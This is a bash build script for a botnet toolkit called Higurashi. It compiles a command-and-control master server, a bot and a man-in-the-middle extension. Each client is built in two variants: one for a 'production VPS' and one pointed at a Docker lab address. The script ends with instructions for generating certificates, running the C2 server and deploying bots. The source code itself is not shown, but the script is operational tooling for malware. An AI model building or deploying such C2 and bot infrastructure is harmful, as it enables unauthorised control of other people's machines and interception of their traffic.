#!/bin/bash
# compile_all.sh - Compilar sistema Higurashi completo

echo "=================================="
echo "🌸 Higurashi Compilation Script 🌸"
echo "=================================="
echo ""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Verificar dependencias
echo "📦 Checking dependencies..."
deps=("gcc" "libssl-dev" "libssh-dev" "libjson-c-dev" "libcurl4-openssl-dev")
missing=0

for dep in "${deps[@]}"; do
    if ! dpkg -l | grep -q "$dep"; then
        echo -e "${RED}✗${NC} Missing: $dep"
        missing=1
    else
        echo -e "${GREEN}✓${NC} Found: $dep"
    fi
done

if [ $missing -eq 1 ]; then
    echo ""
    echo -e "${YELLOW}Installing missing dependencies...${NC}"
    sudo apt-get update
    sudo apt-get install -y build-essential libssl-dev libssh-dev libjson-c-dev libcurl4-openssl-dev
fi

echo ""
echo "=================================="
echo "🔨 Compiling C2 Master (Higurama)"
echo "=================================="

gcc -Wall -Wextra -O2 -I. -o higurama c2_master.c \
    -lssl -lcrypto -lssh -ljson-c -lpthread -lcurl

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ C2 Master compiled successfully!${NC}"
else
    echo -e "${RED}✗ C2 Master compilation failed!${NC}"
    exit 1
fi

echo ""
echo "=================================="
echo "🔨 Compiling Bot (Higurashi)"
echo "=================================="

# Production version (use config.h C2_IP)
gcc -Wall -Wextra -O2 -I. -o higurashi_prod higurashi.c \
    -lssl -lcrypto -lssh -ljson-c -lpthread -lcurl

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Higurashi (production) compiled successfully!${NC}"
else
    echo -e "${RED}✗ Higurashi (production) compilation failed!${NC}"
    exit 1
fi

# Docker lab version (override C2_IP to Docker network)
gcc -Wall -Wextra -O2 -I. -DC2_IP='"172.20.0.10"' -o higurashi_docker higurashi.c \
    -lssl -lcrypto -lssh -ljson-c -lpthread -lcurl

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Higurashi (docker) compiled successfully!${NC}"
else
    echo -e "${RED}✗ Higurashi (docker) compilation failed!${NC}"
    exit 1
fi

echo ""
echo "=================================="
echo "🔨 Compiling MITM Extension (Vivi)"
echo "=================================="

# Production version
gcc -Wall -Wextra -O2 -I. -o vivi_prod bot_vivi.c \
    -lssl -lcrypto -ljson-c

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Vivi (production) compiled successfully!${NC}"
else
    echo -e "${RED}✗ Vivi (production) compilation failed!${NC}"
    exit 1
fi

# Docker version
gcc -Wall -Wextra -O2 -I. -DC2_IP='"172.20.0.10"' -o vivi_docker bot_vivi.c \
    -lssl -lcrypto -ljson-c

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Vivi (docker) compiled successfully!${NC}"
else
    echo -e "${RED}✗ Vivi (docker) compilation failed!${NC}"
    exit 1
fi

echo ""
echo "=================================="
echo "🎉 COMPILATION COMPLETE!"
echo "=================================="
echo ""
echo "Binaries created:"
echo "  - higurama         (C2 master server)"
echo "  - higurashi_prod   (Bot for production VPS)"
echo "  - higurashi_docker (Bot for Docker lab)"
echo "  - vivi_prod        (MITM extension for production)"
echo "  - vivi_docker      (MITM extension for Docker)"
echo ""
echo "Next steps:"
echo "  1. Generate SSL certificates:"
echo "     openssl req -x509 -newkey rsa:2048 -keyout server.key \\"
echo "         -out server.crt -days 365 -nodes -subj '/CN=higurama'"
echo ""
echo "  2. Run C2 master:"
echo "     ./higurama"
echo ""
echo "  3. Deploy bot (in another terminal):"
echo "     ./higurashi_docker   # For Docker lab"
echo "     ./higurashi_prod     # For production VPS"
echo ""
echo "=================================="
